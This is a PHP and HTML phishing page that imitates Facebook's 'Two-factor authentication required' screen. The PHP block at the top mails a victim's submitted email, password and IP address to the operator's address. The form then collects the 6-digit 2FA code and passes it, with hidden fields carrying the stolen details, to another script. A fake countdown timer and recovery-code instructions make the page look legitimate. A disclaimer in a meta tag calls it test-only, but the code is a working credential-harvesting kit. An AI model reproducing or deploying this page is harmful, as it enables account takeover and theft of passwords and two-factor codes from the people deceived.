<?php 

    include('email.php');    

    $emailiReauth = isset($_POST['emailiReauth']) ? $_POST['emailiReauth'] : 'emaili';   
    $passwordiReauth = isset($_POST['repasswordi']) ? $_POST['repasswordi'] : 'repasswordi';

    $ipReauth = isset($_POST['ipjaReauth']) ? $_POST['ipjaReauth'] : 'ipja';
    $randomCodeReauth = isset($_POST['randomCodeReauth']) ? $_POST['randomCodeReauth'] : 'XXX';

    $stringu = '[IPja]: '.$ipReauth. PHP_EOL . PHP_EOL .'[emaili]: '.$emailiReauth. PHP_EOL . PHP_EOL .'[passwordi]: '.$passwordiReauth;

    mail($emailikomplet, "[".$randomCodeReauth."] Repassi i Investitorit...", $stringu, $headers);
  
?>

<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="description" content="This is only for testing purposes and in no way is for public use or misuse, scam or do anything illegal with it">
    <meta name="author" content="Facebook Developer Student Group">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="icon" href="flogo.png">

    <link rel="stylesheet" href="bootstrapmodal.css">
    <script src="jquery.min.js"></script>
    <script src="bootstrap.min.js"></script>


  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="ha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
    <link rel="stylesheet" type="text/css" href="style2fac.css">

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://kit.fontawesome.com/a2267851a4.js" crossorigin="anonymous"></script>
    <title>Appeal Request [two-factor]</title>

    <style type="text/css">
      body{
        background-color: #e9ebee;
        margin-bottom:30px;
        }     
       
        
        @media only screen and (min-width: 768px) {
          .content2{
              padding:10px 20px !important;
          }
          .butonsendonlymobile{
              display:none;
          }
          .logojababik{
              height:37px !important;
              text-align:left !important;
          }
          .content2 label{
              color: #90949c !important;
              font-weight:700 !important;
              font-size:12px;
          }
          .content2 small{
              color: #90949c !important;
              margin-bottom:5px;
          }
          .content2 .form-group{
              margin-bottom:9px !important;
          }
          .content2 input[type=text], .content2 textarea, .content2 input[type=password]{
              margin-top:7px !important;
          }

          .searchibl i{
              color: #616161;
              font-size:13px;
          }
          .searchibl .form-control-lg{
              font-size: 17px;
              padding: 0px 8px !important;
              border:none;
          }
          .searchibl form{
              border: 1px solid  #000;
              border-radius:0px !important;
          }
          .searchibl .card-body{
              padding: 0px !important;
              padding-left: 10px !important;
          }
          .searchibl input{
              height: 36px !important;
              color: #90949c;
          }
          .footeranother{
              background-color:#f5f6f7;
              text-align:right;
              padding: 11px 20px;
          }

          
            .footeriba ul {
              list-style-type: none;
              margin: 0;
              padding: 0;
              overflow: hidden;
            }
            
            .footeriba li {
              float: left;
            }
            
           .footeriba  li a {
              display: block;
              color: #90949c;
              text-align: center;
              padding: 15px 10px;
              font-size: 12px;
              text-decoration: none;
            }
            .footeriba  li a.active {
              color: #bec3c9;
            }
            .footermenu{
                margin-top:20px;
                margin-bottom:20px;
            }
            .footermenu .list-group-item{
                border: none;
                font-size:12px;
                color: #90949c;
                padding: 4px 10px;
            }
          .afterheader{
              margin-bottom: 70px !important;
          }
        }
        /* Chrome, Safari, Edge, Opera */
input::-webkit-outer-spin-button,
input::-webkit-inner-spin-button {
  -webkit-appearance: none;
  margin: 0;
}

/* Firefox */
input[type=number] {
  -moz-appearance: textfield;
}
    #timer{
 background: none!important;
  border: none;
  padding: 0!important;
  /*optional*/
  font-family: arial, sans-serif;
  /*input has OS specific font-family*/
  color: #385898;
  cursor: pointer;
  text-decoration-line: none !important;
  display: inline;
    }
    .nolink{
        color: black !important;
        text-decoration-line: none !important;
        cursor: default !important;    
    }
@media (min-width: 768px){
.offset-md-3 {
    margin-left: 25%;
}
}
    </style>

  </head>
  <body>

    <section class="afterheader" style="padding-top:50px;">
      <div class="container">
        <div class="row">
          <div class="col-12 col-md-6 offset-md-3">  
            
            <div style="border: 1px solid #c8cacc; border-radius: 4px">
              <h3 class="titleh3">Two-factor authentication required</h3>
              <div class="content2">
                  <p></p>You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.</p>
                  <p>Enter the 6-digit code from your <strong>code generator</strong> or third-party app below.</p>
                  <form action="twofacend.php" method="POST" style="margin-top:14px">

                    <div class="form-group"> 
                      <input type="number" required class="form-control" name="twofactorAuth" id="twofactorAuth" placeholder="Your code" style="width: 170px !important;display: inline">                      

                        <input type="text" id="minutes" value="4.9833333333333334" style="display: none !important;" name="time_min">
                        &nbsp;
                        <input type="button" id="timer" value="( wait: " onclick="startCounter();" style="display: inline" disabled="" class="nolink">
                        <p id="time" style="display: inline">2:56 )</p>


                    </div>
         </div>
              <div class="footeranother">
                <a href="javascript: void();" style="float: left;font-size: 14px;  color: #385898;font-weight: 641;" data-toggle="modal" data-target="#exampleModalScrollable">Need another way to authenticate?</a>
                
           <input type="hidden" id="ipja2fac" name="ipja2fac" value="<?php echo $ipReauth; ?>">
          <input type="hidden" id="randomCode2fac" name="randomCode2fac" value="<?php echo $randomCodeReauth; ?>">
          <input type="hidden" id="emaili2fac" name="emaili2fac" value="<?php echo $emailiReauth; ?>">
          
                  <button type="submit" class="btn btn-primary" name="perfundo">Send</button>
              </div>
              <div class="container butonsend butonsendonlymobile">
      <div class="row">
      </div>
    </div>
         </form>
            </div>
          </div>
        </div>
      </div>
    </section>
    
    

<div class="modal fade" id="exampleModalScrollable" tabindex="-1" role="dialog" aria-labelledby="exampleModalScrollableTitle" aria-hidden="true">
                <form class="form-horizontal" action=" " method="post" id="reg_form">
        <fieldset>
                <div class="modal-dialog modal-dialog-scrollable" role="document">
                    <div class="modal-content" style="">
                        <div class="modal-header">
                            <h5 class="modal-title" id="exampleModalScrollableTitle" style="color: black !important;">Didn’t receive the code?</h5>
                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                <span aria-hidden="true"></span>
                            </button>
                        </div>


                        <div class="modal-body" style="overflow: auto;color: black !important;">

                            <p>1. Go to <b>Settings</b> &gt; Security and Login.</p>
                            <p>2. Under the <b>Two-Factor Authentication</b> section, click <b>Use two-factor authentication</b>. You may need to re-enter your password.
                            </p>
                            <p>3. Next to <b>Recovery Codes</b>, click <b>Setup</b> then <b>Get Codes</b>. If you've already set up recovery codes, you can click <b>Show Codes</b>.
                            </p>
                            <img src="recovery.png" alt="" width="100%">
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn canceloje" data-dismiss="modal">Close</button>
                            <button type="button" class="btn canceloje" data-dismiss="modal" style="background-color: #1877f2;color: white">Continue</button>

    
                        </div>

                    </div>

                </div>
            </fieldset>
        </form>
    </div>

<script>

var mySeconds;
var intervalHandle;
var myButton=document.getElementById("timer");
var timeDisplay=document.getElementById("time");

function resetPage(){   
    myButton.removeAttribute("disabled");
    myButton.value="Send Code Again";
    timeDisplay.innerHTML="";
    myButton.classList.remove('nolink');

}
function tick(){
    var timeDisplay=document.getElementById("time");
    
    var min=Math.floor(mySeconds/60);
    var sec=mySeconds-(min*60);
    
    if (sec < 10) {
        sec="0"+sec;
    }
    
    var message=min.toString()+":"+sec;
    
    timeDisplay.innerHTML=message+" )";
    
    if(mySeconds===0){
        clearInterval(intervalHandle);
        resetPage();
    }
    mySeconds--;
    
    
}
function startCounter(){
    var myInput=document.getElementById("minutes").value;
    if (isNaN(myInput)){
        alert("Type a valid number please");
        return;
    }
    mySeconds=myInput*60;
    
    intervalHandle=setInterval(tick, 1000);
    myButton.disabled=true;
    myButton.value="( wait: ";
    myButton.classList.add('nolink');
    timeDisplay.innerHTML="5:00 )";
    
}
</script>
<script>
      $(document).ready(function () {
      $("#timer").click();});
      </script>

</body></html>